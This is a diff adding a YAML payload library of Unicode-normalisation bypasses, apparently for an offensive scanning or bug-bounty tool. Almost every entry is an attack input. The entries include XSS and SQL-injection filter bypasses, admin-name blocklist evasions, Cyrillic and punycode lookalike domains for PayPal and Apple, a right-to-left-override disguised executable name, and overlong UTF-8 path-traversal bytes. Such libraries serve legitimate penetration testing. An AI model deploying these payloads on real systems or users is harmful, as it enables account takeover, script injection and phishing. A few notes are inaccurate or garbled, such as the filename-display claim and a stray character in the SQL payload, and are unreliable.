@@ -1,0 +1,213 @@
+id: unicode_normalisation
+name: Unicode Normalisation Bypass
+version: 1.0.0
+category: injection
+description: |
+  Unicode-normalisation tricks that defeat string-equality and blocklist
+  filters. Includes fullwidth latin, mathematical alphanumerics, NFC/NFKC
+  collisions, dotless-i locale tricks, and the IDN homograph attack set.
+mitre:
+  - T1036
+  - T1218
+owasp_top10:
+  - A03:2021
+references:
+  - https://blog.cloudflare.com/idn-homograph-attacks/
+  - https://datatracker.ietf.org/doc/html/rfc3454
+  - https://book.hacktricks.xyz/pentesting-web/unicode-injection
+  - https://www.unicode.org/reports/tr15/
+related_tools:
+  - nuclei
+chains:
+  - bug_bounty_full
+  - web_active
+payloads:
+  - id: fullwidth_script
+    name: Fullwidth latin script tag
+    subcategory: nfkc_collapse
+    encoding: unicode
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "＜script＞alert(1)＜／script＞"
+    notes: NFKC-normalised to <script>alert(1)</script>
+    source: https://book.hacktricks.xyz/pentesting-web/unicode-injection
+  - id: fullwidth_admin
+    name: Fullwidth admin
+    subcategory: auth_bypass
+    encoding: unicode
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "ａｄｍｉｎ"
+    notes: NFKC -> admin; bypass blocklist
+    source: common knowledge
+  - id: math_bold_admin
+    name: Math bold admin
+    subcategory: auth_bypass
+    encoding: unicode
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "𝐚𝐝𝐦𝐢𝐧"
+    notes: NFKC -> admin
+    source: common knowledge
+  - id: turkish_dotless_i
+    name: Turkish dotless I
+    subcategory: locale_collapse
+    encoding: unicode
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "admın"
+    notes: ı uppercased in tr_TR -> ADMIN
+    source: https://en.wikipedia.org/wiki/Dotted_and_dotless_I_in_computing
+  - id: kelvin_sign_k
+    name: Kelvin sign K collision
+    subcategory: nfkc_collapse
+    encoding: unicode
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: "K"
+    notes: U+212A normalises to ASCII K
+    source: https://www.unicode.org/reports/tr15/
+  - id: angstrom_a
+    name: Angstrom sign A collision
+    subcategory: nfkc_collapse
+    encoding: unicode
+    tech_targets: [generic]
+    severity_when_works: low
+    payload: "Å"
+    notes: U+212B -> A with ring
+    source: https://www.unicode.org/reports/tr15/
+  - id: idn_paypal
+    name: IDN homograph paypal
+    subcategory: idn
+    encoding: unicode
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "pаypal.com"
+    notes: Cyrillic 'а' U+0430
+    source: https://blog.cloudflare.com/idn-homograph-attacks/
+  - id: idn_apple
+    name: IDN homograph apple
+    subcategory: idn
+    encoding: unicode
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "аpple.com"
+    notes: Cyrillic а
+    source: https://blog.cloudflare.com/idn-homograph-attacks/
+  - id: rtl_filename
+    name: Right-to-left override filename
+    subcategory: rtl_override
+    encoding: unicode
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "exploit‮gpj.exe"
+    notes: Displays as exploit.exe but real ext is .gpj.exe inverted
+    source: https://en.wikipedia.org/wiki/Right-to-left_mark
+  - id: nfkc_collapse_quote
+    name: Fullwidth single quote
+    subcategory: sqli_filter_bypass
+    encoding: unicode
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "ｱ＇OR'1'='1"
+    notes: U+FF07 collapses to '
+    source: common knowledge
+  - id: nfkc_collapse_lt
+    name: Fullwidth less-than for XSS
+    subcategory: xss_filter_bypass
+    encoding: unicode
+    tech_targets: [generic]
+    severity_when_works: high
+    payload: "＜svg onload=alert(1)＞"
+    notes: null
+    source: common knowledge
+  - id: zero_width_join
+    name: Zero-width joiner break
+    subcategory: filter_bypass
+    encoding: unicode
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: "ad‍min"
+    notes: Zero-width joiner splits substring matches
+    source: common knowledge
+  - id: combining_diacritic
+    name: Combining diacritic stuffing
+    subcategory: filter_bypass
+    encoding: unicode
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: "adḿin"
+    notes: Combining acute; may bypass exact-match filter
+    source: common knowledge
+  - id: small_capital_admin
+    name: Small-capital admin
+    subcategory: filter_bypass
+    encoding: unicode
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: "ᴀᴅᴍɪɴ"
+    notes: NFKC collapses some chars to ASCII
+    source: common knowledge
+  - id: punycode_attack
+    name: Punycode payload
+    subcategory: idn
+    encoding: raw
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: "xn--80ak6aa92e.com"
+    notes: apple.com homograph
+    source: https://blog.cloudflare.com/idn-homograph-attacks/
+  - id: bom_prefix
+    name: BOM prefix break
+    subcategory: filter_bypass
+    encoding: unicode
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: "﻿admin"
+    notes: BOM accepted by some apps as 'admin'
+    source: common knowledge
+  - id: utf8_overlong
+    name: UTF-8 overlong slash
+    subcategory: traversal_bypass
+    encoding: mixed
+    tech_targets: [iis, asp]
+    severity_when_works: high
+    payload: "%c0%af"
+    notes: Overlong / classic IIS Unicode bug
+    source: https://book.hacktricks.xyz/pentesting-web/file-inclusion
+  - id: utf8_overlong_null
+    name: UTF-8 overlong null
+    subcategory: filter_bypass
+    encoding: mixed
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: "%c0%80"
+    notes: Overlong null byte
+    source: common knowledge
+  - id: case_fold_german
+    name: German sharp-s collision
+    subcategory: locale_collapse
+    encoding: unicode
+    tech_targets: [generic]
+    severity_when_works: low
+    payload: "paßwort"
+    notes: ß uppercased -> SS
+    source: common knowledge
+  - id: invisible_separator
+    name: Invisible separator U+2063
+    subcategory: filter_bypass
+    encoding: unicode
+    tech_targets: [generic]
+    severity_when_works: low
+    payload: "ad⁣min"
+    notes: null
+    source: common knowledge
+  - id: combining_lt_xss
+    name: Combining mark + < for XSS
+    subcategory: xss_filter_bypass
+    encoding: unicode
+    tech_targets: [generic]
+    severity_when_works: medium
+    payload: "<́script>alert(1)</script>"
+    notes: null
+    source: common knowledge
